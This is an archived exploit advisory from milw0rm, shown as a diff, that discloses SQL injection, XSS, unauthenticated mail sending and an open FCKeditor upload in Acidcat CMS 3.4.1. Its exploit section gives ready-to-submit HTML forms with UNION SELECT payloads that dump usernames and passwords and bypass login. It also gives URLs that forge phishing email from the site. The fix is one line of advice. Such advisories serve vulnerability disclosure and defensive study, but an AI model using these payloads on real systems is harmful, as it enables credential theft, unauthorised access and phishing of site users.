@@ -1,0 +1,83 @@
+########################## www.BugReport.ir #######################################
+#
+#      AmnPardaz Security Research Team
+#
+# Title: Acidcat CMS Multiple Vulnerabilities.
+# Vendor: www.acidcat.com
+# Vulnerable Version: 3.4.1
+# Exploit: Available
+# Impact: High
+# Fix: N/A
+# Original Advisory: http://bugreport.ir/index.php?/36
+###################################################################################
+
+
+####################
+1. Description:
+####################
+Acidcat CMS is a web site and simple Content Management System that can be administered via a web browser.
+
+####################
+2. Vulnerability:
+####################
+    2.1. There is a SQL Injection in "default.asp". By using it, attacker can gain usernames and encrypted passwords.
+        2.1.1. POC:
+                Check the exploit section.
+    2.2. There is a logical vulnerability in which attacker can send email by the site without any permission.
+        2.2.1. POC:
+                Check the exploit section.
+    2.3. There is a SQL Injection in "main_login2.asp". By using it, attacker can login to the site.
+        2.3.1. POC:
+                Check the exploit section.
+    2.4. There is a XSS in "/admin/admin_colors_swatch.asp".
+        2.4.1. POC:
+                /admin/admin_colors_swatch.asp?field=value='';}alert('XSS');function(){myForm.myText
+    2.5. There is a FckEditor which has no permission, and attacker can upload his/her file.
+        2.5.1. POC:
+                /admin/fckeditor/editor/filemanager/connectors/test.html
+####################
+3. Exploits:
+####################
+
+ Original Exploit URL: http://bugreport.ir/index.php?/36/exploit
+
+    3.1. Attacker can gain usernames and passwords:
+    -------------
+        <form action="http://[The URL]/default.asp?formType=&itemID=" method="post">
+        <input type="text" name="cID" id="cID" value="-1 union select 1,username,3,password,5,6,7,8,9,10,'1-1-2000','1-1-2010' from ac_user" />
+        <br />
+        <input type="submit" value="Submit" />
+        </form>
+
+    -------------
+    3.2. Attacker can send email without any permission:
+     -------------
+        default_mail_aspemail.asp? AcidcatSend=1&From=Fake@Site.com&FromName=FakeAdmin&To=Victim@Email.com&Subject=Forgery&Body=Change your password to 123456!
+
+        default_mail_cdosys.asp? AcidcatSend=1&From=Fake@Site.com&FromName=FakeAdmin&To=Victim@Email.com&Subject=Forgery&Body=Change your password to 123456!
+
+        default_mail_jmail.asp? AcidcatSend=1&From=Fake@Site.com&FromName=FakeAdmin&To=Victim@Email.com&Subject=Forgery&Body=Change your password to 123456!
+    -------------
+    3.3. Attacker can login to the site:
+    -------------
+        <form action="main_login2.asp" method="post">
+        <input type="hidden" name="username" id="username" value="FooNot' union select 1,2,3,'%CE%10%C9%CE%AC%0F%F3%07A%91%8B%1B%9FF%2D%DF%EBcO%9Au%5F%28%80%A5%0D%D0%89%EA%EF%3E%BB%BDx%5F%0EM%7C%09%2C%B6s%9D%EAa%2FqX%7E%08%05%CAZ%26%1ET%10%CE' from ac_user where Username='1'or'1'='1'or'1'='1" size="200"/>
+        <br />
+        <input type="hidden" name="password" id="password" value="0" />
+        <br />
+        <input type="submit" value="Click To Login!" />
+        </form>
+    -------------
+####################
+4. Solution:
+####################
+    Edit the source code to ensure that inputs are properly sanitized.
+####################
+- Credit :
+####################
+AmnPardaz Security Research & Penetration Testing Group
+Contact: admin[4t}bugreport{d0t]ir
+WwW.BugReport.ir
+WwW.AmnPardaz.com
+
+# milw0rm.com [2008-04-20]
